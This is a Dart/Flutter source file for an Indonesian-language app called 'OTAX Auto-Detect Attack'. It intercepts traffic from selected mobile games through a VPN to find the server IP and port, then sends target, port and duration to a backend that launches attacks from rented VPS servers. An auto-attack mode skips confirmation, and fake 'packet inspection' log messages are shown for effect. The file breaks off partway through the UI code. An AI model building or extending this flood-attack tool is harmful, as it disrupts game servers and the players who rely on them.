import 'dart:async';
import 'dart:convert';
import 'dart:math' as math;
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_overlay_window/flutter_overlay_window.dart';
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'main.dart';

// ─── Game Model ──────────────────────────────────────────────────────────────
class GameInfo {
  final String package_;
  final String name;
  final String icon; // key untuk emoji/icon
  final Color color;
  bool selected;

  GameInfo({
    required this.package_,
    required this.name,
    required this.icon,
    required this.color,
    this.selected = true,
  });

  String get emoji {
    switch (icon) {
      case 'ml':     return '⚔️';
      case 'ff':     return '🔥';
      case 'roblox': return '🟥';
      case 'pubg':   return '🎯';
      case 'cod':    return '💀';
      case 'genshin':return '🌙';
      case 'coc':    return '🏰';
      case 'cr':     return '👑';
      case 'hsr':    return '🚂';
      case 'wr':     return '🗡️';
      default:       return '🎮';
    }
  }
}

// ─── Page ─────────────────────────────────────────────────────────────────────
class AutoDetectPage extends StatefulWidget {
  final String sessionKey;
  final List<Map<String, dynamic>> savedVPS;

  const AutoDetectPage({
    Key? key,
    required this.sessionKey,
    this.savedVPS = const [],
  }) : super(key: key);

  @override
  State<AutoDetectPage> createState() => _AutoDetectPageState();
}

class _AutoDetectPageState extends State<AutoDetectPage>
    with TickerProviderStateMixin {

  // ─── Channels ──────────────────────────────────────────────────────────
  static const _usageChannel   = MethodChannel('com.otax/usage_stats');
  static const _monitorChannel = MethodChannel('app_monitor_channel');
  static const _eventChannel   = EventChannel('app_events_channel');

  // ─── Animations ────────────────────────────────────────────────────────
  late AnimationController _radarController;
  late AnimationController _pulseController;
  late AnimationController _resultController;
  late Animation<double>   _pulseAnim;
  late Animation<double>   _resultAnim;

  // ─── State ─────────────────────────────────────────────────────────────
  List<Map<String, dynamic>> _vpsList    = [];
  List<Map<String, dynamic>> _selectedVPS = [];
  List<GameInfo> _installedGames = [];
  bool _loadingVPS   = true;
  bool _loadingGames = true;

  bool _overlayGranted    = false;
  bool _vpnGranted        = false;
  bool _usageStatsGranted = false;

  bool   _vpnScanActive  = false;
  String _detectedIP     = '';
  int    _detectedPort   = 0;
  String _detectedGame   = '';
  String _scanStatusText = 'Pilih game lalu tap SCAN';
  List<String> _scanLog  = [];

  int  _attackDuration = 60;
  int  _targetPort     = 10001;
  bool _autoAttack     = false;

  StreamSubscription? _eventSub;
  Timer? _gameCheckTimer;
  Timer? _logTimer;

  // Fake scan log messages for visual effect
  static const _scanMessages = [
    'Initializing VPN tunnel...',
    'Intercepting game traffic...',
    'Analyzing packet headers...',
    'Scanning port range...',
    'Monitoring connections...',
    'Deep packet inspection...',
    'Tracking UDP streams...',
    'Identifying game server...',
    'Resolving IP address...',
    'Filtering private ranges...',
  ];
  int _msgIdx = 0;

  // ─── Init ──────────────────────────────────────────────────────────────
  @override
  void initState() {
    super.initState();
    _setupAnimations();
    _init();
  }

  void _setupAnimations() {
    _radarController = AnimationController(
      vsync: this, duration: const Duration(seconds: 2))..repeat();

    _pulseController = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 1500))..repeat(reverse: true);
    _pulseAnim = Tween<double>(begin: 0.8, end: 1.0).animate(
      CurvedAnimation(parent: _pulseController, curve: Curves.easeInOut));

    _resultController = AnimationController(
      vsync: this, duration: const Duration(milliseconds: 600));
    _resultAnim = CurvedAnimation(parent: _resultController, curve: Curves.elasticOut);
  }

  Future<void> _init() async {
    await _checkPermissions();
    await _fetchVPSList();
    await _loadInstalledGames();
    _listenEvents();
    _monitorChannel.setMethodCallHandler((call) async {
      if (call.method == 'onMLIPFound') {
        final ip   = call.arguments['ip']?.toString() ?? '';
        final port = (call.arguments['port'] as int?) ?? 0;
        final game = call.arguments['game_name']?.toString() ?? '';
        _onIPFound(ip, port, game);
      }
    });
  }

  @override
  void dispose() {
    _radarController.dispose();
    _pulseController.dispose();
    _resultController.dispose();
    _eventSub?.cancel();
    _gameCheckTimer?.cancel();
    _logTimer?.cancel();
    _stopVpnScan();
    super.dispose();
  }

  // ─── Events ────────────────────────────────────────────────────────────
  void _listenEvents() {
    _eventSub = _eventChannel.receiveBroadcastStream().listen((e) {
      if (e is Map && e['type'] == 'ip_found') {
        _onIPFound(
          e['ip']?.toString() ?? '',
          (e['port'] as int?) ?? 0,
          e['game_name']?.toString() ?? '',
        );
      }
    });
  }

  void _onIPFound(String ip, int port, String game) {
    if (!mounted || ip.isEmpty) return;
    _resultController.forward(from: 0);
    setState(() {
      _detectedIP    = ip;
      _detectedPort  = port;
      _detectedGame  = game;
      _scanStatusText = '✅ Server ditemukan! Port: $port';
    });
    _addLog('🎯 Server: $ip:$port (real-time)');
    try {
      FlutterOverlayWindow.shareData({'type': 'ip_detected', 'ip': ip, 'port': port});
    } catch (_) {}
    if (_autoAttack && _selectedVPS.isNotEmpty) _launchAttack();
  }

  void _addLog(String msg) {
    if (!mounted) return;
    setState(() {
      _scanLog.insert(0, '${_timestamp()} $msg');
      if (_scanLog.length > 8) _scanLog.removeLast();
    });
  }

  String _timestamp() {
    final now = DateTime.now();
    return '[${now.hour.toString().padLeft(2,'0')}:${now.minute.toString().padLeft(2,'0')}:${now.second.toString().padLeft(2,'0')}]';
  }

  // ─── Permissions ───────────────────────────────────────────────────────
  Future<void> _checkPermissions() async {
    bool overlay = await FlutterOverlayWindow.isPermissionGranted();
    if (!overlay) overlay = await FlutterOverlayWindow.requestPermission() ?? false;

    bool vpn = false;
    try { vpn = await _monitorChannel.invokeMethod<bool>('checkVpnPermission') ?? false; } catch (_) {}

    bool usage = false;
    try { usage = await _usageChannel.invokeMethod<bool>('checkUsageStatsPermission') ?? false; } catch (_) { usage = true; }

    await Permission.notification.request();
    if (!mounted) return;
    setState(() { _overlayGranted = overlay; _vpnGranted = vpn; _usageStatsGranted = usage; });
  }

  Future<void> _requestVpnPermission() async {
    try {
      final r = await _monitorChannel.invokeMethod<bool>('requestVpnPermission') ?? false;
      if (!mounted) return;
      setState(() => _vpnGranted = r);
      if (!r) {
        await Future.delayed(const Duration(seconds: 2));
        final granted = await _monitorChannel.invokeMethod<bool>('checkVpnPermission') ?? false;
        if (mounted) setState(() => _vpnGranted = granted);
      }
    } catch (_) {}
  }

  // ─── Data ──────────────────────────────────────────────────────────────
  Future<void> _fetchVPSList() async {
    if (!mounted) return;
    setState(() => _loadingVPS = true);
    try {
      final res = await http.get(
        Uri.parse('http://127.0.0.1:4113/myServer?key=${widget.sessionKey}'),
      ).timeout(const Duration(seconds: 10));
      if (res.statusCode == 200) {
        final data = jsonDecode(res.body) as List;
        if (!mounted) return;
        setState(() => _vpsList = List<Map<String, dynamic>>.from(data));
      }
    } catch (_) {} finally {
      if (mounted) setState(() => _loadingVPS = false);
    }
  }

  Future<void> _loadInstalledGames() async {
    if (!mounted) return;
    setState(() => _loadingGames = true);
    try {
      final result = await _monitorChannel.invokeMethod<List>('getInstalledGames');
      if (result != null && mounted) {
        setState(() {
          _installedGames = result.map((g) {
            final map = Map<String, dynamic>.from(g as Map);
            return GameInfo(
              package_: map['package'] as String,
              name:     map['name'] as String,
              icon:     map['icon'] as String,
              color:    _gameColor(map['icon'] as String),
            );
          }).toList();
          _loadingGames = false;
        });
      }
    } catch (_) {
      // Fallback: tampilkan semua game dari database
      if (!mounted) return;
      setState(() {
        _installedGames = [
          GameInfo(package_: 'com.mobile.legends', name: 'Mobile Legends', icon: 'ml', color: const Color(0xFF3D8BFF)),
          GameInfo(package_: 'com.dts.freefireth', name: 'Free Fire', icon: 'ff', color: const Color(0xFFFF6B35)),
          GameInfo(package_: 'com.roblox.client',  name: 'Roblox', icon: 'roblox', color: const Color(0xFFE53935)),
          GameInfo(package_: 'com.tencent.ig',     name: 'PUBG Mobile', icon: 'pubg', color: const Color(0xFFFFC107)),
          GameInfo(package_: 'com.activision.callofduty.shooter', name: 'COD Mobile', icon: 'cod', color: const Color(0xFF607D8B)),
        ];
        _loadingGames = false;
      });
    }
  }

  Color _gameColor(String icon) {
    switch (icon) {
      case 'ml':     return const Color(0xFF3D8BFF);
      case 'ff':     return const Color(0xFFFF6B35);
      case 'roblox': return const Color(0xFFE53935);
      case 'pubg':   return const Color(0xFFFFC107);
      case 'cod':    return const Color(0xFF607D8B);
      case 'genshin':return const Color(0xFF26C6DA);
      case 'coc':    return const Color(0xFF8BC34A);
      case 'cr':     return const Color(0xFF9C27B0);
      case 'hsr':    return const Color(0xFF7E57C2);
      case 'wr':     return const Color(0xFFF44336);
      default:       return Colors.grey;
    }
  }

  // ─── Scan ──────────────────────────────────────────────────────────────
  Future<void> _startVpnScan() async {
    if (_vpnScanActive) return;
    if (!_vpnGranted) {
      await _requestVpnPermission();
      if (!_vpnGranted) return;
    }

    final selectedPkgs = _installedGames
        .where((g) => g.selected)
        .map((g) => g.package_)
        .toList();

    if (selectedPkgs.isEmpty) {
      _showSnack('Pilih minimal 1 game untuk di-scan!', isError: true);
      return;
    }

    setState(() {
      _vpnScanActive  = true;
      _detectedIP     = '';
      _detectedPort   = 0;
      _detectedGame   = '';
      _scanStatusText = 'Memulai VPN scanner...';
      _scanLog.clear();
    });

    try {
      await _monitorChannel.invokeMethod('startVpnScan', {'packages': selectedPkgs});
      _addLog('🚀 Scanner aktif untuk ${selectedPkgs.length} game');

      // Fake log messages untuk visual effect
      _logTimer?.cancel();
      _logTimer = Timer.periodic(const Duration(seconds: 2), (_) {
        if (!_vpnScanActive || !mounted) { _logTimer?.cancel(); return; }
        _addLog('🔍 ${_scanMessages[_msgIdx % _scanMessages.length]}');
        _msgIdx++;
        if (_detectedIP.isEmpty) {
          setState(() => _scanStatusText = 'Buka game lalu mainkan...');
        }
      });

      // Monitor game detection
      _gameCheckTimer?.cancel();
      _gameCheckTimer = Timer.periodic(const Duration(seconds: 3), (_) async {
        try {
          final game = await _monitorChannel.invokeMethod<Map>('getRunningGame');
          if (!mounted) return;
          if (game != null) {
            final gameName = game['name']?.toString() ?? '';
            if (!gameName.isEmpty && mounted) {
              setState(() => _scanStatusText = '🎮 $gameName terdeteksi! Menunggu server...');
            }
            if (_overlayGranted) _showOverlay();
          }
        } catch (_) {}
      });
    } catch (e) {
      setState(() { _vpnScanActive = false; _scanStatusText = 'Error: $e'; });
    }
  }

  Future<void> _stopVpnScan() async {
    _logTimer?.cancel();
    _gameCheckTimer?.cancel();
    if (!_vpnScanActive) return;
    try { await _monitorChannel.invokeMethod('stopVpnScan'); } catch (_) {}
    if (mounted) {
      setState(() {
        _vpnScanActive  = false;
        _scanStatusText = 'Scan dihentikan';
      });
    }
  }

  Future<void> _showOverlay() async {
    if (!_overlayGranted) return;
    try {
      final isActive = await FlutterOverlayWindow.isActive();
      if (!isActive) {
        await FlutterOverlayWindow.showOverlay(
          height: 280, width: 260,
          alignment: OverlayAlignment.topLeft,
          flag: OverlayFlag.defaultFlag,
          overlayTitle: 'OTAX Scanner',
          overlayContent: 'Detecting...',
          enableDrag: true,
          positionGravity: PositionGravity.auto,
        );
      }
    } catch (_) {}
  }

  // ─── Attack ────────────────────────────────────────────────────────────
  Future<void> _launchAttack() async {
  if (_detectedIP.isEmpty || _selectedVPS.isEmpty) return;
  if (!_autoAttack) {
    final ok = await _showConfirmDialog();
    if (ok != true) return;
  }
  // Gunakan port yang terdeteksi real-time, fallback ke _targetPort jika belum ada
  final effectivePort = _detectedPort > 0 ? _detectedPort : _targetPort;
  try {
    final res = await http.post(
      Uri.parse('http://127.0.0.1:4113/sendCommand'),
      headers: {'Content-Type': 'application/json'},
      body: jsonEncode({
        'key': widget.sessionKey,
        'target': _detectedIP,
        'port': effectivePort,
        'duration': _attackDuration,
      }),
    ).timeout(const Duration(seconds: 10));

    if (res.statusCode == 200) {
      final data = jsonDecode(res.body);
      _addLog('💥 Attack: ${data['message']}');
      _showSnack('✅ ${data['message']}');
    } else {
      String error = 'Gagal: ${res.statusCode}';
      try {
        final err = jsonDecode(res.body);
        error = err['error'] ?? error;
      } catch (_) {}
      _showSnack('❌ $error', isError: true);
    }
  } catch (e) {
    _showSnack('Error: $e', isError: true);
  }
}

  Future<bool?> _showConfirmDialog() {
    final effectivePort = _detectedPort > 0 ? _detectedPort : _targetPort;
    final portLabel = _detectedPort > 0 ? '$_detectedPort ✅ auto-detect' : '$_targetPort ⚠️ fallback';
    return showDialog<bool>(
    context: context,
    builder: (_) => AlertDialog(
      backgroundColor: const Color(0xFF1A1A2E),
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(20)),
      title: Row(children: [
        const Text('⚡', style: TextStyle(fontSize: 24)),
        const SizedBox(width: 8),
        const Text('Launch Attack', style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold)),
      ]),
      content: Column(mainAxisSize: MainAxisSize.min, children: [
        _dRow('🎯 Target', _detectedIP),
        _dRow('🎮 Game', _detectedGame.isEmpty ? '-' : _detectedGame),
        _dRow('🔌 Port', portLabel),
        _dRow('⏱️ Durasi', '$_attackDuration detik'),
        _dRow('🖥️ VPS', '${_selectedVPS.length} server'),
      ]),
      actions: [
        TextButton(onPressed: () => Navigator.pop(context, false),
            child: const Text('Batal', style: TextStyle(color: Colors.white38))),
        ElevatedButton(
          onPressed: () => Navigator.pop(context, true),
          style: ElevatedButton.styleFrom(backgroundColor: Colors.red,
              shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(10))),
          child: const Text('🚀 LAUNCH'),
        ),
      ],
    ),
  );
  }

  Widget _dRow(String l, String v) => Padding(
    padding: const EdgeInsets.symmetric(vertical: 4),
    child: Row(children: [
      Text(l, style: const TextStyle(color: Colors.white54, fontSize: 13)),
      const Spacer(),
      Text(v, style: const TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 13)),
    ]),
  );

  void _showSnack(String msg, {bool isError = false}) {
    if (!mounted) return;
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(msg),
      backgroundColor: isError ? Colors.red[700] : Colors.green[700],
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
      margin: const EdgeInsets.all(12),
    ));
  }

  // ─── BUILD ─────────────────────────────────────────────────────────────
  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF0D0D1A),
      body: SafeArea(
        child: Column(
          children: [
            _buildAppBar(),
            Expanded(
              child: SingleChildScrollView(
                child: Column(
                  children: [
                    _buildRadarSection(),
                    _buildScanLog(),
                    _buildGameSelector(),
                    _buildVPSSection(),
                    _buildBottomActions(),
                    const SizedBox(height: 16),
                  ],
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }

  // ─── AppBar ────────────────────────────────────────────────────────────
  Widget _buildAppBar() {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 12),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: [const Color(0xFF1A0030), const Color(0xFF0D0D1A)],
          begin: Alignment.topCenter, end: Alignment.bottomCenter,
        ),
        border: const Border(bottom: BorderSide(color: Color(0xFF2A2A4A), width: 1)),
      ),
      child: Row(
        children: [
          GestureDetector(
            onTap: () => Navigator.pop(context),
            child: const Icon(Icons.arrow_back_ios, color: Colors.white70, size: 20),
          ),
          const SizedBox(width: 12),
          // Logo / Title
          Container(
            padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              gradient: const LinearGradient(colors: [Color(0xFFE040FB), Color(0xFF7C4DFF)]),
              borderRadius: BorderRadius.circular(8),
            ),
            child: const Text('OTAX', style: TextStyle(
              color: Colors.white, fontWeight: FontWeight.w900,
              fontSize: 13, letterSpacing: 2)),
          ),
          const SizedBox(width: 10),
          const Text('Auto-Detect Attack',
              style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 15)),
          const Spacer(),
          IconButton(
            icon: const Icon(Icons.refresh, color: Colors.white54, size: 20),
            onPressed: () { _fetchVPSList(); _loadInstalledGames(); },
          ),
          IconButton(
            icon: const Icon(Icons.tune, color: Colors.white54, size: 20),
            onPressed: _showSettings,
          ),
        ],
      ),
    );
  }

  // ─── RADAR SECTION (main visual) ───────────────────────────────────────
  Widget _buildRadarSection() {
    final hasIP = _detectedIP.isNotEmpty;
    return Container(
      margin: const EdgeInsets.all(16),
      padding: const EdgeInsets.all(20),
      decoration: BoxDecoration(
        gradient: LinearGradient(
          colors: hasIP
              ? [const Color(0xFF0A2A0A), const Color(0xFF0D1A0D)]
              : _vpnScanActive
                  ? [const Color(0xFF0A0A2E), const Color(0xFF0D0D1A)]
                  : [const Color(0xFF1A1A2E), const Color(0xFF0D0D1A)],
          begin: Alignment.topLeft, end: Alignment.bottomRight,
        ),
        borderRadius: BorderRadius.circular(24),
        border: Border.all(
          color: hasIP
              ? Colors.green.withOpacity(0.5)
              : _vpnScanActive
                  ? const Color(0xFF7C4DFF).withOpacity(0.5)
                  : Colors.white12,
          width: 1.5,
        ),
        boxShadow: [
          BoxShadow(
            color: hasIP
                ? Colors.green.withOpacity(0.15)
                : _vpnScanActive
                    ? const Color(0xFF7C4DFF).withOpacity(0.15)
                    : Colors.transparent,
            blurRadius: 30, spreadRadius: 2,
          ),
        ],
      ),
      child: Column(
        children: [
          // ── Radar visual ───────────────────────────────────────────────
          SizedBox(
            height: 180,
            child: Stack(
              alignment: Alignment.center,
              children: [
                // Radar rings
                ...List.generate(4, (i) => _radarRing(i, hasIP)),
                // Rotating sweep line
                if (_vpnScanActive && !hasIP)
                  AnimatedBuilder(
                    animation: _radarController,
                    builder: (_, __) => CustomPaint(
                      size: const Size(180, 180),
                      painter: _RadarSweepPainter(_radarController.value),
                    ),
                  ),
                // Center icon
                AnimatedBuilder(
                  animation: _pulseAnim,
                  builder: (_, child) => Transform.scale(
                    scale: _vpnScanActive ? _pulseAnim.value : 1.0,
                    child: child,
                  ),
                  child: Container(
                    width: 70, height: 70,
                    decoration: BoxDecoration(
                      shape: BoxShape.circle,
                      gradient: RadialGradient(colors: hasIP
                          ? [Colors.green.shade400, Colors.green.shade900]
                          : _vpnScanActive
                              ? [const Color(0xFF7C4DFF), const Color(0xFF1A0040)]
                              : [const Color(0xFF2A2A4A), const Color(0xFF0D0D1A)]),
                      boxShadow: [BoxShadow(
                        color: hasIP ? Colors.green.withOpacity(0.5)
                            : _vpnScanActive ? const Color(0xFF7C4DFF).withOpacity(0.5)
                            : Colors.transparent,
                        blurRadius: 20, spreadRadius: 2,
                      )],
                    ),
                    child: Center(child: Text(
                      hasIP ? '✅' : _vpnScanActive ? '📡' : '🎮',
                      style: const TextStyle(fontSize: 30),
                    )),
                  ),
                ),
                // IP result overlay (animates in)
                if (hasIP)
                  Positioned(
                    bottom: 0,
                    child: ScaleTransition(
                      scale: _resultAnim,
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 6),
                        decoration: BoxDecoration(
                          color: Colors.green.withOpacity(0.2),
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: Colors.green.withOpacity(0.5)),
                        ),
                        child: Text(
                          '$_detectedIP : $_detectedPort',
                          style: const TextStyle(
                            color: Colors.greenAccent,
                            fontWeight: FontWeight.bold,
                            fontSize: 13,
                            fontFamily: 'monospace',
                          ),
                        ),
                      ),
                    ),
                  ),
              ],
            ),
          ),

          const SizedBox(height: 16),

          // ── Status text ────────────────────────────────────────────────
          Text(_scanStatusText,
            style: TextStyle(
              color: hasIP ? Colors.greenAccent
                  : _vpnScanActive ? const Color(0xFFCE93D8) : Colors.white54,
              fontSize: 13, fontWeight: FontWeight.w600,
            ),
            textAlign: TextAlign.center,
          ),

          // ── Game detected badge ────────────────────────────────────────
          if (_detectedGame.isNotEmpty) ...[
            const SizedBox(height: 8),
            Container(
              padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 4),
              decoration: BoxDecoration(
                color: Colors.blue.withOpacity(0.2),
                borderRadius: BorderRadius.circular(20),
                border: Border.all(color: Colors.blue.withOpacity(0.4)),
              ),
              child: Text('🎮 $_detectedGame',
                style: const TextStyle(color: Colors.lightBlue, fontSize: 12, fontWeight: FontWeight.bold)),
            ),
          ],

          const SizedBox(height: 16),

          // ── Status grid ────────────────────────────────────────────────
          Row(children: [
            _statusChip('VPN', _vpnScanActive, _vpnScanActive ? '🟢' : '⚪'),
            const SizedBox(width: 8),
            _statusChip('Overlay', _overlayGranted, _overlayGranted ? '🟢' : '🔴'),
            const SizedBox(width: 8),
            _statusChip('Usage', _usageStatsGranted, _usageStatsGranted ? '🟢' : '🟡'),
          ]),

          const SizedBox(height: 16),

          // ── Scan button ────────────────────────────────────────────────
          GestureDetector(
            onTap: _vpnScanActive ? _stopVpnScan : _startVpnScan,
            child: AnimatedContainer(
              duration: const Duration(milliseconds: 300),
              width: double.infinity,
              height: 52,
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: _vpnScanActive
                      ? [const Color(0xFFFF5722), const Color(0xFFE91E63)]
                      : [const Color(0xFF7C4DFF), const Color(0xFF3D5AFE)],
                ),
                borderRadius: BorderRadius.circular(16),
                boxShadow: [BoxShadow(
                  color: (_vpnScanActive ? Colors.orange : const Color(0xFF7C4DFF)).withOpacity(0.4),
                  blurRadius: 15, offset: const Offset(0, 4),
                )],
              ),
              child: Row(mainAxisAlignment: MainAxisAlignment.center, children: [
                Icon(_vpnScanActive ? Icons.stop_circle : Icons.radar,
                    color: Colors.white, size: 20),
                const SizedBox(width: 10),
                Text(
                  _vpnScanActive ? 'STOP SCAN' : 'MULAI SCAN',
                  style: const TextStyle(color: Colors.white, fontWeight: FontWeight.w900,
                      fontSize: 15, letterSpacing: 1.5),
                ),
              ]),
            ),
          ),
        ],
      ),
    );
  }

  Widget _radarRing(int i, bool hasIP) {
    final size = 50.0 + i * 30.0;
    final color = hasIP ? Colors.green : _vpnScanActive ? const Color(0xFF7C4DFF) : Colors.white;
    return AnimatedContainer(
      duration: const Duration(milliseconds: 300),
      width: size, height: size,
      decoration: BoxDecoration(
        shape: BoxShape.circle,
        border: Border.all(color: color.withOpacity(0.15 - i * 0.025), width: 1),
      ),
    );
  }

  Widget _statusChip(String label, bool active, String emoji) {
    return Expanded(child: Container(
      padding: const EdgeInsets.symmetric(vertical: 8),
      decoration: BoxDecoration(
        color: active ? Colors.white.withOpacity(0.05) : Colors.white.withOpacity(0.02),
        borderRadius: BorderRadius.circular(10),
        border: Border.all(color: active ? Colors.white12 : Colors.white.withOpacity(0.05)),
      ),
      child: Column(children: [
        Text(emoji, style: const TextStyle(fontSize: 14)),
        const SizedBox(height: 2),
        Text(label, style: const TextStyle(color: Colors.white38, fontSize: 10)),
      ]),
    ));
  }

  // ─── SCAN LOG ──────────────────────────────────────────────────────────
  Widget _buildScanLog() {
    if (!_vpnScanActive && _scanLog.isEmpty) return const SizedBox();
    return Container(
      margin: const EdgeInsets.symmetric(horizontal: 16),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: const Color(0xFF050510),
        borderRadius: BorderRadius.circular(12),
        border: Border.all(color: const Color(0xFF1A1A3A)),
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            Container(width: 8, height: 8,
                decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    color: _vpnScanActive ? Colors.green : Colors.grey)),
            const SizedBox(width: 8),
            const Text('SCAN LOG', style: TextStyle(
                color: Color(0xFF4CAF50), fontSize: 10,
                fontWeight: FontWeight.bold, letterSpacing: 2)),
          ]),
          const SizedBox(height: 8),
          ..._scanLog.map((log) => Padding(
            padding: const EdgeInsets.only(bottom: 3),
            child: Text(log,
              style: TextStyle(
                color: log.contains('🎯') ? Colors.greenAccent
                    : log.contains('💥') ? Colors.orangeAccent
                    : const Color(0xFF64FFDA),
                fontSize: 11, fontFamily: 'monospace',
              ),
            ),
          )),
        ],
      ),
    );
  }

  // ─── GAME SELECTOR ────────────────────────────────────────────────────
  Widget _buildGameSelector() {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 12, 16, 0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Text('🎮 Pilih Game Target',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
            const Spacer(),
            if (_loadingGames)
              const SizedBox(width: 14, height: 14,
                  child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFF7C4DFF))),
            if (!_loadingGames)
              GestureDetector(
                onTap: () => setState(() {
                  final allSelected = _installedGames.every((g) => g.selected);
                  for (var g in _installedGames) g.selected = !allSelected;
                }),
                child: Text(
                  _installedGames.every((g) => g.selected) ? 'Batal semua' : 'Pilih semua',
                  style: const TextStyle(color: Color(0xFF7C4DFF), fontSize: 12),
                ),
              ),
          ]),
          const SizedBox(height: 10),
          if (_installedGames.isEmpty && !_loadingGames)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.03),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white12),
              ),
              child: const Center(child: Text(
                '⚠️ Tidak ada game yang terdeteksi terinstall',
                style: TextStyle(color: Colors.white38, fontSize: 12),
              )),
            )
          else
            Wrap(
              spacing: 8, runSpacing: 8,
              children: _installedGames.map(_buildGameChip).toList(),
            ),
        ],
      ),
    );
  }

  Widget _buildGameChip(GameInfo game) {
    return GestureDetector(
      onTap: () => setState(() => game.selected = !game.selected),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        padding: const EdgeInsets.symmetric(horizontal: 12, vertical: 8),
        decoration: BoxDecoration(
          gradient: game.selected
              ? LinearGradient(colors: [
                  game.color.withOpacity(0.3),
                  game.color.withOpacity(0.1),
                ])
              : null,
          color: game.selected ? null : Colors.white.withOpacity(0.04),
          borderRadius: BorderRadius.circular(12),
          border: Border.all(
            color: game.selected ? game.color.withOpacity(0.7) : Colors.white12,
            width: game.selected ? 1.5 : 1,
          ),
        ),
        child: Row(mainAxisSize: MainAxisSize.min, children: [
          Text(game.emoji, style: const TextStyle(fontSize: 16)),
          const SizedBox(width: 6),
          Text(game.name,
            style: TextStyle(
              color: game.selected ? Colors.white : Colors.white38,
              fontSize: 12, fontWeight: game.selected ? FontWeight.bold : FontWeight.normal,
            ),
          ),
          if (game.selected) ...[
            const SizedBox(width: 4),
            Icon(Icons.check_circle, size: 12, color: game.color),
          ],
        ]),
      ),
    );
  }

  // ─── VPS SECTION ──────────────────────────────────────────────────────
  Widget _buildVPSSection() {
    return Container(
      margin: const EdgeInsets.fromLTRB(16, 16, 16, 0),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(children: [
            const Text('🖥️ Pilih VPS Attack',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 14)),
            const Spacer(),
            if (_loadingVPS)
              const SizedBox(width: 14, height: 14,
                  child: CircularProgressIndicator(strokeWidth: 2, color: Color(0xFF7C4DFF)))
            else
              Text('${_vpsList.length} VPS',
                  style: const TextStyle(color: Colors.white38, fontSize: 12)),
          ]),
          const SizedBox(height: 10),
          if (_loadingVPS)
            const Center(child: CircularProgressIndicator(color: Color(0xFF7C4DFF)))
          else if (_vpsList.isEmpty)
            Container(
              padding: const EdgeInsets.all(16),
              decoration: BoxDecoration(
                color: Colors.white.withOpacity(0.03),
                borderRadius: BorderRadius.circular(12),
                border: Border.all(color: Colors.white12),
              ),
              child: Row(children: [
                const Icon(Icons.cloud_off, color: Colors.white24, size: 20),
                const SizedBox(width: 10),
                const Expanded(child: Text('Tidak ada VPS', style: TextStyle(color: Colors.white38, fontSize: 13))),
                GestureDetector(
                  onTap: _fetchVPSList,
                  child: const Text('Refresh', style: TextStyle(color: Color(0xFF7C4DFF), fontSize: 12)),
                ),
              ]),
            )
          else
            Column(
              children: _vpsList.map((vps) {
                final sel = _selectedVPS.any((v) => v['host'] == vps['host']);
                return _buildVPSItem(vps, sel);
              }).toList(),
            ),
        ],
      ),
    );
  }

  Widget _buildVPSItem(Map<String, dynamic> vps, bool selected) {
    return GestureDetector(
      onTap: () => setState(() {
        if (selected) _selectedVPS.removeWhere((v) => v['host'] == vps['host']);
        else _selectedVPS.add(vps);
      }),
      child: AnimatedContainer(
        duration: const Duration(milliseconds: 200),
        margin: const EdgeInsets.only(bottom: 8),
        padding: const EdgeInsets.symmetric(horizontal: 14, vertical: 12),
        decoration: BoxDecoration(
          gradient: selected ? const LinearGradient(
            colors: [Color(0xFF1A0A2E), Color(0xFF0D0D1A)],
          ) : null,
          color: selected ? null : Colors.white.withOpacity(0.03),
          borderRadius: BorderRadius.circular(14),
          border: Border.all(
            color: selected ? const Color(0xFF7C4DFF).withOpacity(0.7) : Colors.white12,
            width: selected ? 1.5 : 1,
          ),
        ),
        child: Row(
          children: [
            Container(
              width: 36, height: 36,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                gradient: selected
                    ? const LinearGradient(colors: [Color(0xFF7C4DFF), Color(0xFF3D5AFE)])
                    : null,
                color: selected ? null : Colors.white.withOpacity(0.06),
              ),
              child: const Center(child: Icon(Icons.computer, size: 16, color: Colors.white70)),
            ),
            const SizedBox(width: 12),
            Expanded(child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Text(vps['alias'] ?? vps['host'] ?? '-',
                    style: TextStyle(
                      color: selected ? Colors.white : Colors.white70,
                      fontWeight: selected ? FontWeight.bold : FontWeight.normal,
                      fontSize: 13,
                    )),
                Text('${vps['host']} • ${vps['username'] ?? 'root'}',
                    style: const TextStyle(color: Colors.white38, fontSize: 11)),
              ],
            )),
            AnimatedContainer(
              duration: const Duration(milliseconds: 200),
              width: 20, height: 20,
              decoration: BoxDecoration(
                shape: BoxShape.circle,
                color: selected ? const Color(0xFF7C4DFF) : Colors.transparent,
                border: Border.all(
